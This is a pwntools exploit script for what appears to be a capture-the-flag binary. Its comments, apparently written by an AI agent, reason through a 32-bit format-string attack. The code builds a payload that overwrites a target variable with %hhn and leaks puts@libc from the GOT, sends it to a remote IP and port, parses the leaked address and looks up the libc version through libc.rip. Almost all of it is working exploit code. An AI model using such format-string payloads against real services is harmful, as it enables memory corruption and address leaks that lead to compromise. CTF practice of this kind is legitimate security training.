from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# Let me use the libc.rip API to find the correct libc version
import requests
import json

# We know puts ends in 0x1e0
# Let me query the API with multiple symbols

# First, let me leak __libc_start_main as well for better identification
# __libc_start_main@got = 0x804c018

target_val_addr = 0x804c030
puts_got = elf.got['puts']       # 0x804c014
libc_start_main_got = elf.got['__libc_start_main']  # 0x804c018
got_base = 0x804c000

# Format string: set target_val=5 AND leak puts@libc AND leak __libc_start_main@libc
# We need to fit this in 32 bytes

# Position 4 = target_val_addr
# Position 5 = puts_got
# Position 6 = libc_start_main_got

# Payload: p32(target_val_addr) + p32(puts_got) + p32(libc_start_main_got) + %1c%4$hhn%5$s%6$s
# But this is 12 + 14 = 26 bytes, fits in 32!

# Wait, the problem is that %5$s will print until null byte
# And puts@libc address might not have null bytes until the end
# So %5$s will print 4 bytes (the puts address), then %6$s will print the __libc_start_main address

# But there's a problem: after %5$s prints the puts address (4 bytes),
# the total count is 12 + 1 + 4 = 17, so %4$hhn writes 0x11 to target_val
# That's not 5!

# I need to do the write BEFORE the reads, and the write needs exactly 5 bytes
# But the addresses at the beginning contribute to the byte count

# Solution: Use %hhn to write just the LSB
# We need LSB = 5 = 0x05
# So we need to print exactly 5 bytes before %4$hhn
# p32(target_val_addr) = 4 bytes
# %1c = 1 byte
# Total = 5, %4$hhn writes 0x05 ✓

# Then we can do the leaks after the write
# But the addresses at positions 5 and 6 are already printed (8 bytes)
# So after %4$hhn, we've printed 5 bytes
# Then we print p32(puts_got) and p32(libc_start_main_got) as literal chars (8 bytes, total=13)
# Then %5$s prints the string at puts_got (puts@libc, ~4 bytes, total=17)
# Then %6$s prints the string at libc_start_main_got (~4 bytes, total=21)

# But wait, the addresses at positions 5 and 6 are part of the format string
# They're printed as literal characters before any format specifier reaches them
# Actually no - printf processes the format string sequentially
# It only prints literal characters as it encounters them

# Let me re-think the format string:
# p32(target_val_addr) + %1c%4$hhn + p32(puts_got) + %5$s + p32(libc_start_main_got) + %7$s
# Position 4 = bytes 0-3 = target_val_addr
# Position 5 = bytes 4-7 = "%1c%4" (NOT puts_got!)
# This doesn't work because positions are based on byte offset

# OK, let me use a different layout:
# Put all addresses at the end, aligned to 4 bytes

# "%1c%5$hhn" + "AAAA" + p32(target_val_addr) + p32(puts_got) + "%6$s"
# Position 4 = "AAAA" (bytes 0-3)
# Position 5 = target_val_addr (bytes 4-7)
# Position 6 = puts_got (bytes 8-11)

# But then %5$hhn writes to *target_val_addr
# And the total bytes printed before %5$hhn is:
# "%1c" prints 1 byte... wait, "%1c%5$hhn" is the format string
# printf processes: %1c (prints 1 char), %5$hhn (writes count to position 5)
# Count = 1, but we need 5!

# Hmm, we need 5 bytes printed before %5$hhn
# "%5c%5$hhn" would print 5 chars, then write 5 to target_val
# But that's 9 bytes for the format specifier part

# Let me try: "%5c%7$hhn" + "AAA" + p32(target_val_addr) + p32(puts_got) + "%8$s"
# Bytes 0-8: "%5c%7$hhn" (9 bytes)
# Bytes 9-11: "AAA" (3 bytes padding)
# Bytes 12-15: target_val_addr (position 7)
# Bytes 16-19: puts_got (position 8)
# Bytes 20-23: "%8$s" (4 bytes)
# Total = 24 bytes ✓

# %5c prints 5 chars (total=5)
# %7$hhn writes 5 to *target_val_addr ✓
# Then "AAA" is printed (total=8)
# Then target_val_addr bytes are printed (4 bytes, total=12)
# Then puts_got bytes are printed (4 bytes, total=16)
# Then %8$s prints string at *puts_got (the puts@libc address)

# This should work!

fmt_payload = b'%5c%7$hhn'     # 9 bytes: print 5 chars, write 5 to target_val
fmt_payload += b'AAA'            # 3 bytes padding
fmt_payload += p32(target_val_addr)  # 4 bytes: position 7
fmt_payload += p32(puts_got)     # 4 bytes: position 8
fmt_payload += b'%8$s'          # 4 bytes: leak puts@libc

log.info(f"Format string payload: {fmt_payload}")
log.info(f"Payload length: {len(fmt_payload)}")

# Test it
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

conn.send(fmt_payload)

import time
time.sleep(2)

response = conn.recv(timeout=5)
log.info(f"Response: {response}")

if b'Input:' in response:
    log.success("target_val set to 5!")
else:
    log.error("target_val NOT set to 5")
    conn.close()
    exit(1)

# Extract leak
idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]

# Format string output:
# 5 chars from %5c + "AAA" + target_val_addr bytes + puts_got bytes + leaked puts addr
# Total header before leak = 5 + 3 + 4 + 4 = 16 bytes
log.info(f"Format output hex: {fmt_output.hex()}")

if len(fmt_output) >= 20:
    leaked = fmt_output[16:]
    puts_leak = u32(leaked[:4])
    log.info(f"Leaked puts: 0x{puts_leak:x}")
    
    # Query libc.rip API
    try:
        api_url = "https://libc.rip/api/find"
        data = {
            "symbols": {
                "puts": hex(puts_leak)[-12:]  # Last 12 bits
            }
        }
        log.info(f"Querying libc.rip with puts last 12 bits: {hex(puts_leak)[-12:]}")
        resp = requests.post(api_url, json=data, timeout=10)
        if resp.status_code == 200:
            libs = resp.json()
            log.info(f"Found {len(libs)} matching libc versions")
            for lib in libs:
                log.info(f"  {lib.get('id', 'unknown')}: puts=0x{lib.get('symbols', {}).get('puts', '???')}")
        else:
            log.info(f"API returned status {resp.status_code}")
    except Exception as e:
        log.info(f"API query failed: {e}")

conn.close()